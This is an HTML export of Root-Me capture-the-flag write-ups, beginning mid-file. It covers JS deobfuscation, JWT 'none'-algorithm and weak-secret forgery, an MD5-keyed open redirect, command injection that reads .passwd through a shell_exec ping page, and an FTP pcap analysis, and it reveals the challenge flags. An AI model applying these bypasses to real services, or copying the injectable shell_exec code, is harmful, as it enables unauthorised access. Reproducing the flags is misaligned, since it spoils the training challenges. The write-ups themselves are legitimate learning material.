(ó + ó) + (É + É) + '\\' + (É + ó) + (ó - ó) + '\\' + (É + É) + (þ) + '\\' + (ó - É) + (É + É) + (ó + ó) + '\\' + (ó - É) + (É + É) + (ó - É) + '\\' + (ó - É) + (É + ó) + (ó - É) + '\\' + (ó - É) + (É + ó) + (É + É) + '\\' + (É + ó) + (ó + ó) + '\\' + (É + ó) + (ó + ó) + '\\' + (É + ó) + (ó + ó) + '\\' + (É + É) + (þ) + '\\' + (É + ó) + (ó - É) + '\\' + (þ) + (ó) + '\\' + (ó - É) + (þ) + (É + ó) + '\'')())()
        &lt;/script&gt;
</code></pre>
<p>What we do now is use <code>toString()</code> to decode the obfuscated code. What it does is, it will reveal the js code without actually executing the code. If you directly paste the obfuscated code, it will again alert the password input. let's replace the last <code>()</code> with <code>.toString()</code>.</p>
<img alt="image" src="https://github.com/user-attachments/assets/27aa5f3c-a32d-47e6-86ca-27314036d705" />
<p>You can see the code:</p>
<pre><code class="language-js">function anonymous() {
    let a = prompt('Entrez le mot de passe');
    if (a === 'REDACTED') {
        alert('bravo');
    } else {
        alert('fail...');
    }
}

</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h3 id="obfuscation-js"><a class="header" href="#obfuscation-js">Obfuscation JS</a></h3>
<p>This time also reading source code but with a little bit change. We can see the password when we inspect the page but its url encoded.</p>
<img width="1040" height="473" alt="image" src="https://github.com/user-attachments/assets/1e74acfb-bbd1-4015-a2d1-264f5cc89a58" />
<p>I decoded the given encoded string/password and it gave me plain password.</p>
<img width="574" height="335" alt="image" src="https://github.com/user-attachments/assets/02ff5593-214d-477c-a0a1-31f931241019" />
<div style="break-before: page; page-break-before: always;"></div><h3 id="javascript---obfuscation-2"><a class="header" href="#javascript---obfuscation-2">Javascript - Obfuscation 2</a></h3>
<p>Here after inspecting the page source , I find the following obfuscation js code. which seems like password we need but encrypted.</p>
<img width="1041" height="457" alt="picture2" src="https://github.com/user-attachments/assets/4a2a13f5-9c6b-4644-931e-56f2b8fc65a7" />
<p>Here we got something like</p>
<pre><code class="language-js">var pass = unescape("unescape%28%22String.fromCharCode%2528104%252C68%252C117%252C102%252C106%252C100%252C107%252C105%252C49%252C53%252C54%2529%22%29");

OR

unescape%28%22String.fromCharCode%2528104%252C68%252C117%252C102%252C106%252C100%252C107%252C105%252C49%252C53%252C54%2529%22%29
</code></pre>
<p>Let's fire up <a href="https://gchq.github.io/CyberChef/">CyberChef</a> and try to decode.</p>
<pre><code class="language-js">RECEIPE -&gt; URL decode
unescape("String.fromCharCode%28104%2C68%2C117%2C102%2C106%2C100%2C107%2C105%2C49%2C53%2C54%29")
twice
unescape("String.fromCharCode(104,68,117,102,106,100,107,105,49,53,54)")
</code></pre>
<p>Now we are near to the password, Let's check the password using the <code>console</code>.
<img width="692" height="127" alt="picture3" src="https://github.com/user-attachments/assets/a2a404dc-c4c6-4ae3-b773-6b1ab7d62e20" /></p>
<div style="break-before: page; page-break-before: always;"></div><h3 id="javascript---source"><a class="header" href="#javascript---source">Javascript - Source.</a></h3>
<p>As previous, just use inspect and try to read source. Wallah, we got the password</p>
<img width="1035" height="431" alt="image" src="https://github.com/user-attachments/assets/a2bb3661-addf-4d8f-9103-e092646aa67e" />
<div style="break-before: page; page-break-before: always;"></div><h1 id="javascript---obfuscation-3"><a class="header" href="#javascript---obfuscation-3">Javascript - Obfuscation 3</a></h1>
<p>We got another JS obfuscation chall, Here I got <code>\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30</code> this in source code.</p>
<p>And The pattern seems to be of hex like
<code>\x35 = 0x35 = 53 in decimal = 5</code></p>
<p>Here we can use concole:</p>
<pre><code class="language-const layer1 = &quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;;">console.log("Layer 1 result:", layer1);
</code></pre>
<img  alt="image" src="https://github.com/user-attachments/assets/41cefbc0-1c8a-4c5b-9931-71dab85ec11f" />
<p>after converting all the hex, we got something like <code>55,56,54,79,115,69,114,116,107,49,50</code></p>
<p>now, lets use ansci decoding.</p>
<pre><code>const charCodes = "55,56,54,79,115,69,114,116,107,49,50";
const decoded = charCodes.split(',').map(code =&gt; String.fromCharCode(code)).join('');
console.log("Final result:", decoded);
</code></pre>
<img alt="image" src="https://github.com/user-attachments/assets/b9074bf0-56b8-4c71-80e4-51713ea2febd" />
<p>Now, we got the password: 786OsErtk12</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="javascript---webpack"><a class="header" href="#javascript---webpack">Javascript - Webpack</a></h2>
<p>AS the name suggests, I just started to look over the source codes like js and css and Under the file <code>app.a92c5074dafac0cb6365.js</code> I got a commented <code>.map</code> file. I just downloaded it and searched for <code>flag</code> string and got the password.</p>
<p>I took literally more than a hour to solve it, I went to the file first but I didn't searched for string <code>flag</code> but instead <code>password</code> and so much more. The recon is too much deeper than the solution.</p>
<img width="1081" height="390" alt="image" src="https://github.com/user-attachments/assets/0ff161a4-0655-4225-ae6b-b390f612b48f" />
<img width="729" height="421" alt="image" src="https://github.com/user-attachments/assets/b67c6e4c-ff27-4692-a38a-63683d00e7d3" />
<img width="880" height="372" alt="image" src="https://github.com/user-attachments/assets/e2260386-c0ec-4abe-8846-7d7832cc26f6" />
<div style="break-before: page; page-break-before: always;"></div><p>!&gt; [!NOTE]</p>
<blockquote>
<p>Here you can find some of mostly solved challenges, as part of the root-me rules, I'm unable to add all the writeups. If you need any guidance, you may also ping me over <a href="https://discord.com/users/936853051984199750">Disocrd</a></p>
</blockquote>
<ul>
<li><a href="rootme/WEB_Server/./rootme/WEB_Server/readme.html">WEB SERVER</a>
<ul>
<li><a href="rootme/WEB_Server/./rootme/WEB_Server/JWT-Introduction/readme.html">JWT Introduction</a></li>
<li><a href="rootme/WEB_Server/./rootme/WEB_Server/HTTP-Openredirect.html">HTTP - Open redirect</a></li>
<li><a href="rootme/WEB_Server/./rootme/WEB_Server/JWT-Weak-secret.html">JWT - Weak secret</a></li>
<li><a href="rootme/WEB_Server/./rootme/WEB_Server/HTTP-User-agent.html">HTTP - User-agent</a></li>
<li><a href="rootme/WEB_Server/./rootme/WEB_Server/HTTP-POST.html">HTTP - Cookies</a></li>
<li><a href="rootme/WEB_Server/./rootme/WEB_Server/HTTP-Directory-indexing.html">HTTP Directory Indexing</a></li>
<li><a href="rootme/WEB_Server/./rootme/WEB_Server/HTTP-improper-redirect.html">HTTP Improper Redirection</a></li>
<li><a href="rootme/WEB_Server/./rootme/WEB_Server/php-command-injection.html">PHP Command Injection</a></li>
<li><a href="rootme/WEB_Server/./rootme/WEB_Server/HTTP-POST.html">HTTP - POST</a></li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="jwt---introduction"><a class="header" href="#jwt---introduction">JWT - Introduction</a></h1>
<p>Here we go again. we have got a login page and there is also a feature for <code>guest</code> login. As the challenge name suggestes, we need to access the admin panel to get the <code>flag</code> i.e. <code>password</code>,</p>
<p>So, I just logged in as guest to figure out the request and responce.</p>
<img  alt="image" src="https://github.com/user-attachments/assets/92c53262-1ca7-4c73-9ac7-c8b2eb5760b7" />
<p>steps:</p>
<ol>
<li>I already set up the <code>JWT Editor</code> extension in my burp, in order to play with tokens.</li>
<li>I just grab the request for <code>guest</code> login. and its seems like the <code>username</code> we have is <code>guest</code>, I tried to change it to <code>admin</code> but no luck.</li>
<li>There also you can see the <code>HS256</code> algorithm used, I tried to change it to <code>none</code> .</li>
</ol>
<img alt="image" src="https://github.com/user-attachments/assets/e145d585-09e2-4730-a37d-acbcbc46fd80" />
<p>And wallah, we got the admin access.</p>
<img alt="image" src="https://github.com/user-attachments/assets/e145d585-09e2-4730-a37d-acbcbc46fd80" />
<p>The password is <code>S1gn4tuR3_v3r1f1c4t10N_1S_1MP0Rt4n7</code></p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="http---open-redirect"><a class="header" href="#http---open-redirect">HTTP - Open redirect</a></h2>
<p>We got a simple website where we can simply go to facebook, twitter or so on. The challenge is to make the website redirect to any other website rather than the given option.
<img width="909" height="257" alt="image" src="https://github.com/user-attachments/assets/c97aa60d-3440-4aa5-b70c-efb125191602" /></p>
<p>As usual, I started to check the <code>source code</code> and just look for <code>request</code> and <code>response</code> over BURP
<img width="1000" height="528" alt="image" src="https://github.com/user-attachments/assets/89cec756-bd71-4090-bfa5-09cfdc0776b0" /></p>
<p>Let's make some changes over the request and try to redirect to <code>evil.com</code> instead.</p>
<img width="1057" height="488" alt="image" src="https://github.com/user-attachments/assets/cd523e41-ca37-47e4-b520-a940f736e0b2" />
<p>Well, interesting,the redirection is primarily checking for the hash and if its incorrect, the redirection gets failed. These are the hash and its respective site for the redirection.</p>
<img width="701" height="140" alt="image" src="https://github.com/user-attachments/assets/3861bf2d-e6cb-4d66-9897-2530fc0ca034" />
<p>Looks like <code>MD5</code> but let's check it from https://hashes.com/en/tools/hash_identifier</p>
<img width="753" height="154" alt="image" src="https://github.com/user-attachments/assets/0c082ed1-7d47-4ec8-a5e7-1bb9e5f13061" />
<p>I got the logic. Let's reverse it
<img width="1098" height="231" alt="image" src="https://github.com/user-attachments/assets/17a07bff-d882-4e6d-b464-c96e8f138a20" /></p>
<p>Okay, everything crystle clear.</p>
<pre><code class="language-bash">echo -n "https://evil.com" | md5sum
-&gt; 7a1eb5272a0de83226e7a50d14334056
</code></pre>
<p>Wallah, we got the flag.</p>
<img width="1031" height="543" alt="image" src="https://github.com/user-attachments/assets/532f1e1c-c7a7-4a01-bc36-993f377ba74c" />
<h2 id="resource-used"><a class="header" href="#resource-used">Resource used:</a></h2>
<ul>
<li>https://hashes.com/en/tools/hash_identifier</li>
<li>https://askubuntu.com/questions/53846/how-to-get-the-md5-hash-of-a-string-directly-in-the-terminal</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="jwt---weak-secret"><a class="header" href="#jwt---weak-secret">JWT - Weak secret</a></h1>
<p>Well as name suggest, we need to crack the given jwt <code>secret</code> and use the secret key to generate a token for <code>admin</code> and access the password to validate the challenge.</p>
<img alt="image" src="https://github.com/user-attachments/assets/63b128ac-ba14-4777-b85e-6156b9cb6ec5" />
<p><code>/token</code></p>
<pre><code class="language-bash">curl http://challenge01.root-me.org/web-serveur/ch59/token
</code></pre>
<pre><code class="language-jq">{"Here is your token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw"}
</code></pre>
<p>As we don't know the secret for the token, we are unable to modify it, Let's try to crack the secret.</p>
<img alt="key" src="https://github.com/user-attachments/assets/93242903-af08-49be-a9f8-bc71e4818dce" />
<p>We got the secret i.e <code>lol</code>, Let's generate a new key from https://jwt.io and use the jwt to access <code>/admin</code></p>
<pre><code class="language-jq">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ.y9GHxQbH70x_S8F_VPAjra_S-CcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA
Incomplete token;
</code></pre>
<p>wallah!!</p>
<img alt="image" src="https://github.com/user-attachments/assets/ad7aeb66-9e72-42ca-ad5d-a744d12e6071" />
<h2 id="resources-used"><a class="header" href="#resources-used">Resources used</a></h2>
<ul>
<li>https://jwt.io</li>
<li>https://github.com/AresS31/jwtcat</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="http---user-agent"><a class="header" href="#http---user-agent">HTTP - User-agent</a></h1>
<p>opps!</p>
<img alt="solved" src="https://github.com/user-attachments/assets/bb159c13-3a6e-4773-928a-aca2bde67c97" />
<div style="break-before: page; page-break-before: always;"></div><h1 id="http---post"><a class="header" href="#http---post">HTTP - POST</a></h1>
<h3 id="statement"><a class="header" href="#statement">Statement</a></h3>
<p>Find a way to beat the top score!</p>
<img width="479" height="279" alt="image" src="https://github.com/user-attachments/assets/38465574-99c7-479f-abd5-591f1a07eae6" />
<p>Grabbed the request modified to larger then <code>999999</code>, go the password.</p>
<pre><code class="language-jq">score=1000000&amp;generate=Give+a+try%21
</code></pre>
<img  alt="contains password" src="https://github.com/user-attachments/assets/fd4b80c1-db3c-4a58-950d-025a0b475af9" />
<div style="break-before: page; page-break-before: always;"></div><h1 id="http---directory-indexing"><a class="header" href="#http---directory-indexing">HTTP - Directory indexing</a></h1>
<pre><code class="language-bash">curl http://challenge01.root-me.org/web-serveur/ch4/
</code></pre>
<pre><code class="language-html">&lt;html&gt;
&lt;body&gt;&lt;link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /&gt;&lt;iframe id='iframe' src='https://www.root-me.org/?page=externe_header'&gt;&lt;/iframe&gt;
&lt;!-- include("admin/pass.html") --&gt;

&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<pre><code class="language-bash">curl http://challenge01.root-me.org/web-serveur/ch4/admin/pass.html
-&gt; nothing just a rickroll.
</code></pre>
<pre><code class="language-bash">curl http://challenge01.root-me.org/web-serveur/ch4/admin/backup/admin.txt
-&gt; contains pass.
</code></pre>
<img  alt="solved" src="https://github.com/user-attachments/assets/b59387f1-148a-42fb-af47-1d09c79fe9bd" />
<div style="break-before: page; page-break-before: always;"></div><h1 id="http---improper-redirect"><a class="header" href="#http---improper-redirect">HTTP - Improper redirect</a></h1>
<img alt="image" src="https://github.com/user-attachments/assets/50868ca1-ff3d-4157-a361-1cd034e25019" />
<div style="break-before: page; page-break-before: always;"></div><h1 id="php-command-injection"><a class="header" href="#php-command-injection">PHP Command Injection</a></h1>
<p>We got some interesting site where we can ping a site.</p>
<img alt="ping" src="https://github.com/user-attachments/assets/afc8625d-d3f7-43fe-8ef1-5197f148924c" />
<p>As name suggestes, lets greb the request and play around it.</p>
<p>ummhmm, interesting</p>
<img width="1116" height="604" alt="image" src="https://github.com/user-attachments/assets/3da9ec8e-a745-4e06-b6e5-fe0d153e9fca" />
<p>As the challenge said, we must need to read the <code>index.php</code>. So, Lets try to read it via command injection. <em>Soultion is in challange name :P</em></p>
<p>nice, we can see the <code>index.php</code> is in parent directory.</p>
<img alt="ls -a" src="https://github.com/user-attachments/assets/eae5a67c-f762-4960-917c-528245c2d5bf" />
<p>Lets try to cat it out. We got the <code>index.php</code>.</p>
<pre><code class="language-php">&lt;?php 
$flag = "".file_get_contents(".passwd")."";
if(isset($_POST["ip"]) &amp;&amp; !empty($_POST["ip"])){
        $response = shell_exec("timeout -k 5 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
        echo $response;
}
?&gt;
</code></pre>
<img alt="index.php" src="https://github.com/user-attachments/assets/e98ab5c2-12c1-4e7f-b2c5-b32bb656e323" />
<p>huh, Well everything is clear, I just cat out the <code>.passwd</code> file and submitted it. Simple ? yes, Lets try to make a script to solve the challenge.</p>
<div style="break-before: page; page-break-before: always;"></div><p>!&gt; [!NOTE]</p>
<blockquote>
<p>Here you can find some of mostly solved challenges, as part of the root-me rules, I'm unable to add all the writeups. If you need any guidance, you may also ping me over <a href="https://discord.com/users/936853051984199750">Disocrd</a></p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h1 id="ftp---authentication"><a class="header" href="#ftp---authentication">FTP - authentication</a></h1>
<p>I think the most easiest chall, the network portion is a new for me to I gotta try this.</p>
<p>There is a <code>pcap</code> file which we have to analyze and find the required password. So, I will be using <code>tshark</code> tool for analyzing the <code>pcap</code> file.</p>
<p>If you want to install <code>tshark</code> in arch linux , you can install it using following command.</p>
<pre><code class="language-bash">sudo pacman -S wireshark-qt
</code></pre>
<p>First, I would check what kind of traffic is present in the file, as shown below.</p>
<details><summary>`tshark -nr ch1.pcap`</summary>
<pre><code class="language-bash">1   0.000000 10.20.144.150 → 10.20.144.151 TCP 74 35974 → 21 [SYN] Seq=0 Win=32648 Len=0 MSS=1380 WS=1 TSval=1657560000 TSecr=0
    2   0.000320 10.20.144.151 → 10.20.144.150 TCP 78 21 → 35974 [SYN, ACK] Seq=0 Ack=1 Win=16384 Len=0 MSS=1356 WS=1 TSval=1657390000 TSecr=1657560000
    3   0.000570 10.20.144.150 → 10.20.144.151 TCP 66 35974 → 21 [ACK] Seq=1 Ack=1 Win=32648 Len=0 TSval=1657560000 TSecr=1657390000
    4   0.060630 10.20.144.151 → 10.20.144.150 FTP 106 Response: 220-QTCP at fran.csg.stercomm.com.
    5   0.275440 10.20.144.150 → 10.20.144.151 TCP 66 35974 → 21 [ACK] Seq=1 Ack=37 Win=32648 Len=0 TSval=1657560500 TSecr=1657390000
    6   0.275760 10.20.144.151 → 10.20.144.150 FTP 126 Response: 220 Connection will close if idle more than 5 minutes.
    7   0.276140 10.20.144.150 → 10.20.144.151 TCP 66 35974 → 21 [ACK] Seq=1 Ack=93 Win=32648 Len=0 TSval=1657560500 TSecr=1657390000
    8   4.216600 10.20.144.150 → 10.20.144.151 FTP 81 Request: USER cdts3500
    9   4.217350 10.20.144.151 → 10.20.144.150 FTP 91 Response: 331 Enter password.
   10   4.217630 10.20.144.150 → 10.20.144.151 TCP 66 35974 → 21 [PSH, ACK] Seq=16 Ack=114 Win=32648 Len=0 TSval=1657564500 TSecr=1657394000
   11   7.639420 10.20.144.150 → 10.20.144.151 FTP 81 Request: PASS cdts3500
   12   7.843260 10.20.144.151 → 10.20.144.150 TCP 70 21 → 35974 [PSH, ACK] Seq=114 Ack=31 Win=16384 Len=0 TSval=1657397500 TSecr=1657568000
   13   8.184000 10.20.144.151 → 10.20.144.150 FTP 95 Response: 230 CDTS3500 logged on.
   14   8.184360 10.20.144.150 → 10.20.144.151 TCP 66 35974 → 21 [PSH, ACK] Seq=31 Ack=139 Win=32648 Len=0 TSval=1657568500 TSecr=1657398000
   15   8.185040 10.20.144.150 → 10.20.144.151 FTP 72 Request: SYST
   16   8.185260 10.20.144.151 → 10.20.144.150 TCP 70 21 → 35974 [PSH, ACK] Seq=139 Ack=37 Win=16384 Len=0 TSval=1657398000 TSecr=1657568500
   17   8.192750 10.20.144.151 → 10.20.144.150 FTP 147 Response: 215  OS/400 is the remote operating system. The TCP/IP version is "V5R2M0".
   18   8.193000 10.20.144.150 → 10.20.144.151 TCP 66 35974 → 21 [PSH, ACK] Seq=37 Ack=216 Win=32648 Len=0 TSval=1657568500 TSecr=1657398000
   19   8.193570 10.20.144.150 → 10.20.144.151 FTP 80 Request: SITE NAMEFMT
   20   8.193780 10.20.144.151 → 10.20.144.150 TCP 70 21 → 35974 [PSH, ACK] Seq=216 Ack=51 Win=16384 Len=0 TSval=1657398000 TSecr=1657568500
   21   8.194900 10.20.144.151 → 10.20.144.150 FTP 105 Response: 250  Now using naming format "0".
   22   8.195140 10.20.144.150 → 10.20.144.151 TCP 66 35974 → 21 [PSH, ACK] Seq=51 Ack=251 Win=32648 Len=0 TSval=1657568500 TSecr=1657398000
   23   8.195700 10.20.144.150 → 10.20.144.151 FTP 71 Request: PWD
   24   8.195910 10.20.144.151 → 10.20.144.150 TCP 70 21 → 35974 [PSH, ACK] Seq=251 Ack=56 Win=16384 Len=0 TSval=1657398000 TSecr=1657568500
   25   8.197050 10.20.144.151 → 10.20.144.150 FTP 106 Response: 257 "CDTS3500" is current library.
   26   8.197280 10.20.144.150 → 10.20.144.151 TCP 66 35974 → 21 [PSH, ACK] Seq=56 Ack=287 Win=32648 Len=0 TSval=1657568500 TSecr=1657398000
   27  20.765720 10.20.144.150 → 10.20.144.151 FTP 72 Request: PASV
   28  20.766000 10.20.144.151 → 10.20.144.150 TCP 70 21 → 35974 [PSH, ACK] Seq=287 Ack=62 Win=16384 Len=0 TSval=1657410500 TSecr=1657581000
   29  20.787770 10.20.144.151 → 10.20.144.150 FTP 121 Response: 227 Entering Passive Mode (10,20,144,151,62,141).
   30  20.788010 10.20.144.150 → 10.20.144.151 TCP 66 35974 → 21 [PSH, ACK] Seq=62 Ack=338 Win=32648 Len=0 TSval=1657581000 TSecr=1657410500
   31  20.797560 10.20.144.150 → 10.20.144.151 TCP 74 35976 → 16013 [SYN] Seq=0 Win=32768 Len=0 MSS=1380 WS=1 TSval=1657581000 TSecr=0
   32  20.797850 10.20.144.151 → 10.20.144.150 TCP 78 16013 → 35976 [SYN, ACK] Seq=0 Ack=1 Win=32768 Len=0 MSS=1356 WS=1 TSval=1657410500 TSecr=1657581000
   33  20.798130 10.20.144.150 → 10.20.144.151 TCP 66 35976 → 16013 [ACK] Seq=1 Ack=1 Win=32768 Len=0 TSval=1657581000 TSecr=1657410500
   34  20.798250 10.20.144.150 → 10.20.144.151 FTP 91 Request: RETR qgpl/apkeyf.apkeyf
   35  20.798450 10.20.144.151 → 10.20.144.150 TCP 70 21 → 35974 [PSH, ACK] Seq=338 Ack=87 Win=16384 Len=0 TSval=1657410500 TSecr=1657581000
   36  21.202190 10.20.144.151 → 10.20.144.150 FTP 132 Response: 150 Retrieving member APKEYF in file APKEYF in library QGPL.
   37  21.202460 10.20.144.150 → 10.20.144.151 TCP 66 35974 → 21 [PSH, ACK] Seq=87 Ack=400 Win=32648 Len=0 TSval=1657581500 TSecr=1657411000
   38  21.313290 10.20.144.151 → 10.20.144.150 FTP-DATA 509 FTP Data: 439 bytes (PASV) (RETR qgpl/apkeyf.apkeyf)
   39  21.393980 10.20.144.151 → 10.20.144.150 TCP 70 16013 → 35976 [FIN, PSH, ACK] Seq=440 Ack=1 Win=32768 Len=0 TSval=1657411500 TSecr=1657581000
   40  21.394160 10.20.144.151 → 10.20.144.150 FTP 113 Response: 250 File transfer completed successfully.
   41  21.394310 10.20.144.150 → 10.20.144.151 TCP 66 35976 → 16013 [ACK] Seq=1 Ack=441 Win=32768 Len=0 TSval=1657581500 TSecr=1657411500
   42  21.394430 10.20.144.150 → 10.20.144.151 TCP 66 35974 → 21 [PSH, ACK] Seq=87 Ack=443 Win=32648 Len=0 TSval=1657581500 TSecr=1657411500
   43  22.169470 10.20.144.150 → 10.20.144.151 TCP 66 35976 → 16013 [FIN, PSH, ACK] Seq=1 Ack=441 Win=32768 Len=0 TSval=1657582500 TSecr=1657411500
   44  22.169800 10.20.144.151 → 10.20.144.150 TCP 70 16013 → 35976 [PSH, ACK] Seq=441 Ack=2 Win=32768 Len=0 TSval=1657412000 TSecr=1657582500
   45  31.007220 10.20.144.150 → 10.20.144.151 FTP 72 Request: QUIT
   46  31.007560 10.20.144.151 → 10.20.144.150 TCP 70 21 → 35974 [PSH, ACK] Seq=443 Ack=93 Win=16384 Len=0 TSval=1657421000 TSecr=1657591500
   47  31.007750 10.20.144.151 → 10.20.144.150 FTP 101 Response: 221 QUIT subcommand received.
   48  31.007830 10.20.144.151 → 10.20.144.150 TCP 70 21 → 35974 [FIN, PSH, ACK] Seq=474 Ack=93 Win=16384 Len=0 TSval=1657421000 TSecr=1657591500
   49  31.008000 10.20.144.150 → 10.20.144.151 TCP 66 35974 → 21 [PSH, ACK] Seq=93 Ack=474 Win=32648 Len=0 TSval=1657591500 TSecr=1657421000
   50  31.008810 10.20.144.150 → 10.20.144.151 TCP 66 35974 → 21 [FIN, PSH, ACK] Seq=93 Ack=474 Win=32648 Len=0 TSval=1657591500 TSecr=1657421000
   51  31.008840 10.20.144.150 → 10.20.144.151 TCP 66 35974 → 21 [PSH, ACK] Seq=94 Ack=475 Win=32648 Len=0 TSval=1657591500 TSecr=1657421000
   52  31.009050 10.20.144.151 → 10.20.144.150 TCP 70 21 → 35974 [PSH, ACK] Seq=475 Ack=94 Win=16384 Len=0 TSval=1657421000 TSecr=1657591500
   53  35.659010 10.20.144.150 → 10.20.144.151 TCP 74 35977 → 23 [SYN] Seq=0 Win=32648 Len=0 MSS=1380 WS=1 TSval=1657596000 TSecr=0
   54  35.659340 10.20.144.151 → 10.20.144.150 TCP 78 23 → 35977 [SYN, ACK] Seq=0 Ack=1 Win=16384 Len=0 MSS=1356 WS=1 TSval=1657425500 TSecr=1657596000
   55  35.659660 10.20.144.150 → 10.20.144.151 TCP 66 35977 → 23 [ACK] Seq=1 Ack=1 Win=32648 Len=0 TSval=1657596000 TSecr=1657425500
   56  35.660510 10.20.144.151 → 10.20.144.150 TELNET 76 Do New Environment Option, Do Terminal Type
   57  35.713440 10.20.144.150 → 10.20.144.151 TELNET 69 Will Terminal Type
   58  35.713670 10.20.144.151 → 10.20.144.150 TELNET 76 Suboption Terminal Type
   59  35.740240 10.20.144.150 → 10.20.144.151 TELNET 69 Will New Environment Option
   60  35.740480 10.20.144.151 → 10.20.144.150 TELNET 95 Suboption New Environment Option
   61  35.740750 10.20.144.150 → 10.20.144.151 TELNET 82 Suboption Terminal Type
   62  35.740960 10.20.144.151 → 10.20.144.150 TELNET 82 Do End of Record, Will End of Record, Do Binary Transmission, Will Binary Transmission
   63  35.741210 10.20.144.150 → 10.20.144.151 TCP 66 35977 → 23 [PSH, ACK] Seq=23 Ack=50 Win=32648 Len=0 TSval=1657596000 TSecr=1657426000
   64  35.741580 10.20.144.150 → 10.20.144.151 TELNET 108 Suboption New Environment Option
   65  35.945290 10.20.144.151 → 10.20.144.150 TCP 70 23 → 35977 [PSH, ACK] Seq=50 Ack=65 Win=16384 Len=0 TSval=1657426000 TSecr=1657596000
   66  35.945610 10.20.144.150 → 10.20.144.151 TELNET 78 Will End of Record, Do End of Record, Do Binary Transmission, Will Binary Transmission
   67  35.945810 10.20.144.151 → 10.20.144.150 TCP 70 23 → 35977 [PSH, ACK] Seq=50 Ack=77 Win=16384 Len=0 TSval=1657426000 TSecr=1657596500
   68  36.350870 10.20.144.151 → 10.20.144.150 TN5250 145 TN5250 Data from Mainframe, End of Record
   69  37.136450 10.20.144.150 → 10.20.144.151 TCP 66 35977 → 23 [PSH, ACK] Seq=77 Ack=125 Win=32648 Len=0 TSval=1657597000 TSecr=1657426500
   70  37.140450 10.20.144.151 → 10.20.144.150 TN5250 573 TN5250 Data from Mainframe, End of Record
   71  37.143150 10.20.144.150 → 10.20.144.151 TCP 66 35977 → 23 [PSH, ACK] Seq=77 Ack=628 Win=32648 Len=0 TSval=1657597000 TSecr=1657426500
   72  41.737360 10.20.144.150 → 10.20.144.151 TN5250 100 TN5250 Data to Mainframe, End of Record
   73  41.737640 10.20.144.151 → 10.20.144.150 TCP 70 23 → 35977 [PSH, ACK] Seq=628 Ack=111 Win=16384 Len=0 TSval=1657432000 TSecr=1657602000
   74  41.964780 10.20.144.151 → 10.20.144.150 TN5250 89 TN5250 Data from Mainframe, End of Record
   75  41.965040 10.20.144.150 → 10.20.144.151 TCP 66 35977 → 23 [PSH, ACK] Seq=111 Ack=647 Win=32648 Len=0 TSval=1657602500 TSecr=1657432000
   76  42.075290 10.20.144.150 → 10.20.144.151 TN5250 139 TN5250 Data to Mainframe, End of Record
   77  42.075500 10.20.144.151 → 10.20.144.150 TCP 70 23 → 35977 [PSH, ACK] Seq=647 Ack=184 Win=16384 Len=0 TSval=1657432000 TSecr=1657602500
   78  42.076210 10.20.144.151 → 10.20.144.150 TN5250 82 TN5250 Data from Mainframe, End of Record
   79  42.076530 10.20.144.150 → 10.20.144.151 TCP 66 35977 → 23 [PSH, ACK] Seq=184 Ack=659 Win=32648 Len=0 TSval=1657602500 TSecr=1657432000
   80  42.156700 10.20.144.151 → 10.20.144.150 TN5250 157 TN5250 Data from Mainframe, End of Record
   81  42.156960 10.20.144.150 → 10.20.144.151 TCP 66 35977 → 23 [PSH, ACK] Seq=184 Ack=746 Win=32648 Len=0 TSval=1657602500 TSecr=1657432500
   82  42.179050 10.20.144.151 → 10.20.144.150 TN5250 233 TN5250 Data from Mainframe, End of Record
   83  42.179310 10.20.144.150 → 10.20.144.151 TCP 66 35977 → 23 [PSH, ACK] Seq=184 Ack=909 Win=32648 Len=0 TSval=1657602500 TSecr=1657432500
   84  42.179570 10.20.144.151 → 10.20.144.150 TN5250 152 TN5250 Data from Mainframe, End of Record
   85  42.179830 10.20.144.150 → 10.20.144.151 TCP 66 35977 → 23 [PSH, ACK] Seq=184 Ack=991 Win=32648 Len=0 TSval=1657602500 TSecr=1657432500
   86  43.279170 10.20.144.150 → 10.20.144.151 TN5250 81 TN5250 Data to Mainframe, End of Record
   87  43.279500 10.20.144.151 → 10.20.144.150 TCP 70 23 → 35977 [PSH, ACK] Seq=991 Ack=199 Win=16384 Len=0 TSval=1657433500 TSecr=1657604000
   88  43.326260 10.20.144.151 → 10.20.144.150 TN5250 84 TN5250 Data from Mainframe, End of Record
   89  43.326500 10.20.144.150 → 10.20.144.151 TCP 66 35977 → 23 [PSH, ACK] Seq=199 Ack=1005 Win=32648 Len=0 TSval=1657604000 TSecr=1657433500
   90  43.334860 10.20.144.151 → 10.20.144.150 TN5250 812 TN5250 Data from Mainframe, End of Record
   91  43.335150 10.20.144.150 → 10.20.144.151 TCP 66 35977 → 23 [PSH, ACK] Seq=199 Ack=1747 Win=32648 Len=0 TSval=1657604000 TSecr=1657433500
   92  46.018550 10.20.144.150 → 10.20.144.151 TN5250 93 TN5250 Data to Mainframe, End of Record
   93  46.018860 10.20.144.151 → 10.20.144.150 TCP 70 23 → 35977 [PSH, ACK] Seq=1747 Ack=226 Win=16384 Len=0 TSval=1657436000 TSecr=1657606500
   94  47.763420 10.20.144.151 → 10.20.144.150 TELNET 1426 Telnet Data…
   95  47.763550 10.20.144.151 → 10.20.144.150 TN5250 450 TN5250 Data from Mainframe, End of Record
